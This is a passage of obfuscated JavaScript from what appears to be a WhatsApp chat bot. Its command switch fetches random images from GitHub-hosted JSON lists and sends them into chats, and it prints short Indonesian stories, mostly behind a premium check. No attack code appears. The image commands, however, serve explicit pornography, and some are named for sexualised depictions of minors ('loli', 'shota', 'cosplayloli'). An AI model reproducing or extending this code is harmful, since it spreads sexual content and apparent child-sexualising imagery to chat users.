          if (/embroiderytext/[_0x5acefe(590)](_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(1325)
          }
          if (/flamingtext/.test(_0x6e642b)) {
            _0x4c6bf5 = _0x5acefe(678)
          }
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad.chat,
            {
              image: { url: _0x5f33a8 },
              caption: '' + mess[_0x5acefe(1184)],
            },
            { quoted: _0x353dad }
          )
        }
        break
      case _0x5acefe(574):
      case _0x5acefe(1089):
      case 'akira':
      case _0x5acefe(806):
      case 'ana':
      case _0x5acefe(1242):
      case 'art':
      case _0x5acefe(1189):
      case _0x5acefe(991):
      case _0x5acefe(1429):
      case _0x5acefe(571):
      case _0x5acefe(1221):
      case 'boruto':
      case _0x5acefe(1220):
      case 'cecan':
      case _0x5acefe(1348):
      case 'chitoge':
      case _0x5acefe(1317):
      case _0x5acefe(925):
      case _0x5acefe(516):
      case _0x5acefe(614):
      case 'cuckold':
      case _0x5acefe(673):
      case 'cyber':
      case 'darkjokes':
      case _0x5acefe(727):
      case _0x5acefe(1003):
      case _0x5acefe(1398):
      case _0x5acefe(955):
      case _0x5acefe(631):
      case _0x5acefe(870):
      case _0x5acefe(1413):
      case _0x5acefe(795):
      case _0x5acefe(907):
      case _0x5acefe(748):
      case _0x5acefe(950):
      case _0x5acefe(1378):
      case _0x5acefe(656):
      case _0x5acefe(811):
      case _0x5acefe(539):
      case _0x5acefe(462):
      case _0x5acefe(552):
      case _0x5acefe(935):
      case _0x5acefe(842):
      case _0x5acefe(499):
      case _0x5acefe(1146):
      case _0x5acefe(1027):
      case 'inori':
      case _0x5acefe(698):
      case _0x5acefe(1017):
      case _0x5acefe(1026):
      case 'itori':
      case _0x5acefe(1377):
      case 'jeni':
      case _0x5acefe(1367):
      case 'justina':
      case _0x5acefe(1197):
      case _0x5acefe(407):
      case 'kakasih':
      case 'kaori':
      case _0x5acefe(1133):
      case 'katakata':
      case _0x5acefe(1073):
      case _0x5acefe(420):
      case _0x5acefe(615):
      case _0x5acefe(524):
      case _0x5acefe(1357):
      case _0x5acefe(1119):
      case _0x5acefe(758):
      case _0x5acefe(1060):
      case _0x5acefe(458):
      case _0x5acefe(650):
      case 'mikasa':
      case _0x5acefe(931):
      case _0x5acefe(403):
      case 'milf':
      case _0x5acefe(610):
      case _0x5acefe(626):
      case _0x5acefe(391):
      case 'mountain':
      case _0x5acefe(672):
      case _0x5acefe(514):
      case _0x5acefe(910):
      case 'nekonime':
      case _0x5acefe(855):
      case _0x5acefe(968):
      case _0x5acefe(1094):
      case _0x5acefe(977):
      case _0x5acefe(668):
      case _0x5acefe(685):
      case _0x5acefe(762):
      case 'programming':
      case _0x5acefe(1021):
      case _0x5acefe(661):
      case _0x5acefe(409):
      case _0x5acefe(1324):
      case _0x5acefe(917):
      case _0x5acefe(546):
      case _0x5acefe(432):
      case _0x5acefe(380):
      case _0x5acefe(1349):
      case _0x5acefe(1416):
      case _0x5acefe(1288):
      case 'satanic':
      case _0x5acefe(1086):
      case _0x5acefe(553):
      case 'shinomiya':
      case _0x5acefe(711):
      case 'shota':
      case _0x5acefe(441):
      case _0x5acefe(542):
      case _0x5acefe(1131):
      case _0x5acefe(1055):
      case _0x5acefe(662):
      case _0x5acefe(951):
      case _0x5acefe(689):
      case _0x5acefe(1409):
      case _0x5acefe(1312):
      case _0x5acefe(1256):
      case _0x5acefe(1210):
      case 'yotsuba':
      case _0x5acefe(558):
      case _0x5acefe(472):
      case _0x5acefe(1422):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          if (/aesthetic/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(679))
          }
          if (/ahegao/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1358))
          }
          if (/akira/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(872))
          }
          if (/akiyama/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(901))
          }
          if (/ana/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(874))
          }
          if (/anjing/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/anjing.json'
            )
          }
          if (/art/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/art.json'
            )
          }
          if (/ass/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(818))
          }
          if (/asuna/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/asuna.json'
            )
          }
          if (/ayuzawa/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(619))
          }
          if (/bdsm/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/bdsm.json'
            )
          }
          if (/boneka/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(478))
          }
          if (/boruto/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(513))
          }
          if (/bts/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/bts.json'
            )
          }
          if (/cecan/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1335))
          }
          if (/chiho/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(486))
          }
          if (/chitoge/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1285))
          }
          if (/cogan/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1068))
          }
          if (/cosplay/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1321))
          }
          if (/cosplayloli/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1014))
          }
          if (/cosplaysagiri/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(605))
          }
          if (/cuckold/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(387))
          }
          if (/cum/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(940))
          }
          if (/cyber/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1033))
          }
          if (/darkjokes/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1305))
          }
          if (/deidara/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1124))
          }
          if (/doraemon/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1054))
          }
          if (/eba/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/eba.json'
            )
          }
          if (/elaina/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/elaina.json'
            )
          }
          if (/emilia/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/emilia.json'
            )
          }
          if (/ero/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(713))
          }
          if (/erza/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1395))
          }
          if (/exo/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1096))
          }
          if (/femdom/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(548))
          }
          if (/foot/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/foot.json'
            )
          }
          if (/freefire/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(696))
          }
          if (/gamewallpaper/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(445))
          }
          if (/gangbang/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1316))
          }
          if (/gifs/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/gifs.json'
            )
          }
          if (/glasses/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(681))
          }
          if (/gremory/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(860))
          }
          if (/hekel/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(436))
          }
          if (/hentai/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/hentai.json'
            )
          }
          if (/hestia/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(734))
          }
          if (/hijaber/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1265))
          }
          if (/hinata/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/hinata.json'
            )
          }
          if (/husbu/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/husbu.json'
            )
          }
          if (/inori/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/inori.json'
            )
          }
          if (/islamic/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(467))
          }
          if (/isuzu/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1211))
          }
          if (/itachi/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(463))
          }
          if (/itori/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/itori.json'
            )
          }
          if (/jahy/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1353))
          }
          if (/jeni/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1194))
          }
          if (/jiso/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1106))
          }
          if (/justina/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(803))
          }
          if (/kaga/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1431))
          }
          if (/kagura/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kagura.json'
            )
          }
          if (/kakasih/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(701))
          }
          if (/kaori/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1182))
          }
          if (/kartun/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1339))
          }
          if (/katakata/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(424))
          }
          if (/keneki/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(961))
          }
          if (/kotori/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1275))
          }
          if (/kpop/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(587))
          }
          if (/kucing/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(834))
          }
          if (/kurumi/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/kurumi.json'
            )
          }
          if (/lisa/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(675))
          }
          if (/loli/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(726))
          }
          if (/madara/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(638))
          }
          if (/masturbation/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(958))
          }
          if (/megumin/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/megumin.json'
            )
          }
          if (/mikasa/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(419))
          }
          if (/mikey/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(667))
          }
          if (/miku/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(410))
          }
          if (/milf/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1352))
          }
          if (/minato/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/minato.json'
            )
          }
          if (/mobil/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(477))
          }
          if (/motor/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/motor.json'
            )
          }
          if (/mountain/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(522))
          }
          if (/naruto/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/naruto.json'
            )
          }
          if (/neko/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(645))
          }
          if (/neko2/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1030))
          }
          if (/nekonime/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(718))
          }
          if (/nezuko/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/nezuko.json'
            )
          }
          if (/onepiece/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/onepiece.json'
            )
          }
          if (/orgy/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(771))
          }
          if (/panties/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(487))
          }
          if (/pentol/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(460))
          }
          if (/pokemon/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1139))
          }
          if (/profil/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1362))
          }
          if (/progamming/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(714))
          }
          if (/pubg/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/pubg.json'
            )
          }
          if (/pussy/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(963))
          }
          if (/randblackpink/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(515))
          }
          if (/randomnime/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(416))
          }
          if (/randomnime2/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(800))
          }
          if (/rize/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/rize.json'
            )
          }
          if (/rose/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1185))
          }
          if (/ryujin/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1258))
          }
          if (/sagiri/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(640))
          }
          if (/sakura/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(782))
          }
          if (/sasuke/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(823))
          }
          if (/satanic/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(659))
          }
          if (/shina/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(580))
          }
          if (/shinka/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinka.json'
            )
          }
          if (/shinomiya/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(521))
          }
          if (/shizuka/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(674))
          }
          if (/shota/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1165))
          }
          if (/tatasurya/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1369))
          }
          if (/technology/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/technology.json'
            )
          }
          if (/tejina/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(926))
          }
          if (/tentacles/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(511))
          }
          if (/thighs/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/thighs.json'
            )
          }
          if (/toukachan/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(390))
          }
          if (/tsunade/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(1373))
          }
          if (/waifu/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/waifu.json'
            )
          }
          if (/wallhp/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallhp.json'
            )
          }
          if (/wallml/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(543))
          }
          if (/wallmlnime/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallnime.json'
            )
          }
          if (/yotsuba/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(802))
          }
          if (/yuki/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(731))
          }
          if (/yulibocil/.test(_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(857))
          }
          if (/yumeko/[_0x5acefe(590)](_0x6e642b)) {
            _0x7cc107 = await fetchJson(_0x5acefe(898))
          }
          _0xe67f0c[_0x5acefe(655)](_0x353dad[_0x5acefe(408)], _0x3c5570, {
            quoted: _0x353dad,
          })
        }
        break
      case 'fox':
      case _0x5acefe(1101):
      case _0x5acefe(1365):
      case _0x5acefe(1296):
      case _0x5acefe(1058):
      case _0x5acefe(812):
        if (!_0x5be15c) {
          return _0x3b9ed4(mess[_0x5acefe(1243)])
        }
        ;(_0x3a7726 = await fetchJson(_0x5acefe(1274) + _0x6e642b)),
          (anu1 = await getBuffer(_0x3a7726[_0x5acefe(982)])),
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            {
              image: anu1,
              caption: '' + mess.succes,
            },
            { quoted: _0x353dad }
          )
        break
      case _0x5acefe(1209):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0xe67f0c[_0x5acefe(655)](
            _0x353dad[_0x5acefe(408)],
            {
              video: { url: _0x2d6012 },
              caption: '' + mess[_0x5acefe(1184)],
            },
            { quoted: _0x353dad }
          )
        }
        break
      case _0x5acefe(482):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x9cafd0.title +
              '\n\u2B54 _*Author :*_ ' +
              _0x9cafd0[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x9cafd0[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x9cafd0[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x9cafd0[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1128):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x42b273.title +
              _0x5acefe(1235) +
              _0x42b273.author +
              _0x5acefe(954) +
              _0x42b273[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x42b273[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x42b273.cerita
          )
        }
        break
      case 'cerpen_bahasainggris':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x78775b[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x78775b.author +
              _0x5acefe(954) +
              _0x78775b[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x78775b[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x78775b[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1136):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x5c3677[_0x5acefe(744)] +
              '\n\u2B54 _*Author :*_ ' +
              _0x5c3677[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x5c3677[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x5c3677.lolos +
              '\n\u2B54 _*Story :*_\n' +
              _0x5c3677[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(929):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x2b6437[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x2b6437[_0x5acefe(1384)] +
              '\n\u2B54 _*Category :*_ ' +
              _0x2b6437[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x2b6437.lolos +
              _0x5acefe(705) +
              _0x2b6437[_0x5acefe(947)]
          )
        }
        break
      case 'cerpen_budaya':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x2cbfba.title +
              _0x5acefe(1235) +
              _0x2cbfba[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x2cbfba[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x2cbfba[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x2cbfba[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(443):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x91d5c5[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x91d5c5[_0x5acefe(1384)] +
              '\n\u2B54 _*Category :*_ ' +
              _0x91d5c5[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x91d5c5.lolos +
              _0x5acefe(705) +
              _0x91d5c5.cerita
          )
        }
        break
      case _0x5acefe(564):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad.reply(
            '\u2B54 _*Title :*_ ' +
              _0x528ae2[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x528ae2[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x528ae2.kategori +
              _0x5acefe(1347) +
              _0x528ae2[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x528ae2[_0x5acefe(947)]
          )
        }
        break
      case 'cerpen_cintapertama':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x52763a[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x52763a.author +
              _0x5acefe(954) +
              _0x52763a.kategori +
              _0x5acefe(1347) +
              _0x52763a[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x52763a[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1042):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x3626ad[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x3626ad.author +
              _0x5acefe(954) +
              _0x3626ad.kategori +
              _0x5acefe(1347) +
              _0x3626ad[_0x5acefe(1105)] +
              '\n\u2B54 _*Story :*_\n' +
              _0x3626ad[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(484):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x526479[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x526479[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x526479[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x526479.lolos +
              '\n\u2B54 _*Story :*_\n' +
              _0x526479.cerita
          )
        }
        break
      case _0x5acefe(880):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x243c34[_0x5acefe(744)] +
              '\n\u2B54 _*Author :*_ ' +
              _0x243c34[_0x5acefe(1384)] +
              '\n\u2B54 _*Category :*_ ' +
              _0x243c34[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x243c34[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x243c34.cerita
          )
        }
        break
      case _0x5acefe(730):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x3f2b83[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x3f2b83[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x3f2b83[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x3f2b83.lolos +
              _0x5acefe(705) +
              _0x3f2b83[_0x5acefe(947)]
          )
        }
        break
      case 'cerpen_galau':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x400a50.title +
              _0x5acefe(1235) +
              _0x400a50[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x400a50[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x400a50.lolos +
              '\n\u2B54 _*Story :*_\n' +
              _0x400a50.cerita
          )
        }
        break
      case _0x5acefe(837):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x5cd264.title +
              _0x5acefe(1235) +
              _0x5cd264[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x5cd264[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x5cd264[_0x5acefe(1105)] +
              '\n\u2B54 _*Story :*_\n' +
              _0x5cd264[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(382):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x476066[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x476066[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x476066.kategori +
              _0x5acefe(1347) +
              _0x476066[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x476066.cerita
          )
        }
        break
      case _0x5acefe(652):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
